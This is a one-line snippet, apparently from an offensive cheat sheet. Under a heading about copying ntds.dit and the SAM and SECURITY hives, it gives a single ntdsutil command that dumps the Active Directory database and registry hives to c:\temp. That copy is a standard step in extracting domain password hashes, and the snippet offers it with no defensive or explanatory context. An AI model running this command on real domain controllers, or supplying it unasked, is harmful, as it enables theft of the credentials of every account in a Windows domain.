### Create a shadow copy of ntds.dit, sam and security hive
```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

